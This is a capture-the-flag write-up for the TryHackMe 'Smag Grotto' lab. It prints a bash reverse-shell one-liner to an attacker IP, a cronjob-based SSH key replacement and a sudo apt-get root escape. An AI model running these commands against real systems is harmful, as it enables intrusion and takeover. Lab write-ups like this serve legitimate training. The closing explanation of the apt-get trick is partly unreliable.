---
layout: post
title: "Smag Grotto"
date: 2022-10-21
categories: [Tryhackme, Easy-THM]
tags: [pcap, /etc/hosts, Command-Injection, ssh-keygen, sudo, apt-get, GTFObins]
image: ../../assets/img/posts/smaggrotto.png 

---

## Description

Follow the yellow brick road.

|**Room**|[Smag Grotto](https://tryhackme.com/room/smaggrotto)|
|:---:|:---:|
|**OS**|Linux|
|**Difficulty**|Easy|
|**Creator**|[jakeyee](https://tryhackme.com/p/jakeyee)|

---

Starting off with deploying the machine and quickly scanning the open ports with rustscan,

```bash
rustscan -a 10.10.43.182 --ulimit 5000
```

![image](https://user-images.githubusercontent.com/67465230/186833123-389ab342-2bb6-4e14-9dfc-c39a49eaa191.png)

We got the open ports and now we can scan them in detail using nmap,

```bash
nmap -sC -sV -p22,80 10.10.43.182 -oN nmap.txt
```

![image](https://user-images.githubusercontent.com/67465230/186833163-672495df-1b14-47d0-95e7-5a04cd5a912b.png)

Result scan shows that port 22 is running ssh service, port 80 is running apache webserver. Let's start enumerating port 80.

Visit http://10.10.43.182,

![image](https://user-images.githubusercontent.com/67465230/186833198-6097bbbb-bddf-43e8-b43a-52b3d5f701e0.png)

we got a welcome message after landing on the website. Enumerating webpage and source code page doesn't reveal anything so I decided to use gobuster to fuzz directories,

```bash
gobuster dir -u http://10.10.43.182 -w /usr/share/seclists/Discovery/Web-Content/common.txt -q 2>/dev/null -o gobuster.log
```

![image](https://user-images.githubusercontent.com/67465230/186833221-c41a6c2a-f6a7-4254-891c-785128d816b5.png)

we got index page and a **mail** directory. Let's check it what's out there.

Visit http://10.10.43.182/mail,

![image](https://user-images.githubusercontent.com/67465230/186833295-19538edc-fe24-44d5-8ab3-8118b0428f95.png)

and we got a page where we got some mails left by the developers, and a _pcap_ file (file which can be used by wireshark for analysis).

Checking the source code and there I found the correct path of the file,

![image](https://user-images.githubusercontent.com/67465230/186833338-0832d705-a3f7-434c-b602-9a5c676fa4fd.png)

Using the `wget` command provided the url of the file, the file can be download,

```bash
wget http://10.10.43.182/aW1wb3J0YW50/dHJhY2Uy.pcap
```

![image](https://user-images.githubusercontent.com/67465230/186833377-2c9228dc-23a0-4add-9418-c8c4419c8d5b.png)

Opening the file in wireshark for analysis and after going through number of requests, there is a POST request which piqued my interest,

![image](https://user-images.githubusercontent.com/67465230/186833410-9e36855e-3bf6-468f-be8d-f47f8b92c0a4.png)

Following its TCP stream, 

![image](https://user-images.githubusercontent.com/67465230/186833456-02db0097-2b4c-4fa3-bf4c-0fcc8e593f89.png)

we got a sub-domain named _development.smag.thm_ and _username & password_.

Now what we can do here is to resolve the domain name into IP address by adding the sub-domain and corresponding IP address in /etc/hosts file,

```bash
10.10.43.182	development.smag.thm
```

![image](https://user-images.githubusercontent.com/67465230/186833478-97695f66-a66b-4361-abff-a002bc919d4b.png)

Now, visit http://development.smag.thm,

![image](https://user-images.githubusercontent.com/67465230/186833515-0742684a-a5ce-4636-aec3-854a28001c2e.png)

we got a open directory which contains pages like admin.php, login.php and a css files.

Visiting http://development.smag.thm/login.php,

![image](https://user-images.githubusercontent.com/67465230/186833557-0bc1ae2f-9f3f-4a0c-8a79-b4c0234cb6ff.png)

We landed on a login page where we need to provide the credentials in order to get into web application.

Providing the credentials we found earlier,

![image](https://user-images.githubusercontent.com/67465230/186833608-d5d9aa4c-dbeb-4805-9a0d-ca56610aca4c.png)

we got in! and it seems like we got a Command Execution functionality (this can be very bad!!). 

After executing commands like `id`, `whoami`, there is nothing much I got. So now, we can try to trigger a reverse shell by first start listener using `nc -nvlp 4444` and then execute one-liner bash reverse shell script,

```bash
bash -c 'exec bash -i &>/dev/tcp/10.9.2.86/4444 <&1'
```

We got the shell,

![image](https://user-images.githubusercontent.com/67465230/186833649-33e32e63-d56f-411c-9551-24243e30694c.png)

But since we got an under-privilege shell, we can improve this using sequence of commands,

```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
export TERM=xterm
CTRL+Z
stty raw -echo; fg
stty rows 38 columns 116
```

Enumerate jake user directory and we got the user flag,

![image](https://user-images.githubusercontent.com/67465230/186833685-5aa5257e-fb02-4c10-8e66-9f1cc9bad2cc.png)

we get "Permission Denied" error while reading the user flag meaning we need to elevate our privileges to higher level user in order to read this flag.

After enumerating there is a cronjob running on the system as root user,

```bash
cat /etc/crontab
```

![image](https://user-images.githubusercontent.com/67465230/186833714-f69520ee-dd26-499f-9db2-a4f7763ec77f.png)

Looks like jake’s ssh public key is copied from a backup directory to *authorized_keys*. This gives us the opportunity to access the machine by generating our own ssh key and replacing jake’s.

Now, we first generate RSA ssh key on our machine,

```bash
ssh-keygen -t rsa
```

![image](https://user-images.githubusercontent.com/67465230/186833748-b8904141-7c8c-40d8-8009-eb57be344e39.png)

this will generate pair of id_rsa key, i.e. a private id_rsa key and a public id_rsa key with *.pub* extension.

Now we can echo our public key into backup directory replacing jake's key,

```bash
echo "<jake.pub>" > /opt/.backups/jake_id_rsa.pub.backup
```

Now, we can login as jake user using our private id_rsa key,

```bash
ssh -i jake jake@10.10.84.69
```

![image](https://user-images.githubusercontent.com/67465230/186833847-cf233da8-755d-4b21-9e1a-75a09923c657.png)

Enumerating directory and now we can read the user flag,

![image](https://user-images.githubusercontent.com/67465230/186833974-b88464d0-4d80-43a0-87da-af576edd044f.png)

Now comes the privilege escalation part where we are just listing all binaries which we can run as `sudo`,

```bash
sudo -l
```

![image](https://user-images.githubusercontent.com/67465230/186834045-e165c3c4-deeb-466c-ab68-ff66be811457.png)

we can see that */usr/bin/apt-get* binary can be run as sudo which can elevate our privileges to root user.

We can take a look at [apt get | GTFOBins](https://gtfobins.github.io/gtfobins/apt-get/) method to achieve the above result,

![image](https://user-images.githubusercontent.com/67465230/186834074-929530b3-0689-43d0-96b0-6cbad725d35c.png)

Running the command and we got the root access,

```bash
sudo apt-get update -o APT::Update::Pre-Invoke::=/bin/sh
```

![image](https://user-images.githubusercontent.com/67465230/186834104-34603ae6-663f-426b-99c1-d28b980d6a3e.png)

> Q. What is the command above doing?
>> A. When the above command runs, or specifically the apt-get binary runs as sudo, the update command is actually executed after the shell exits.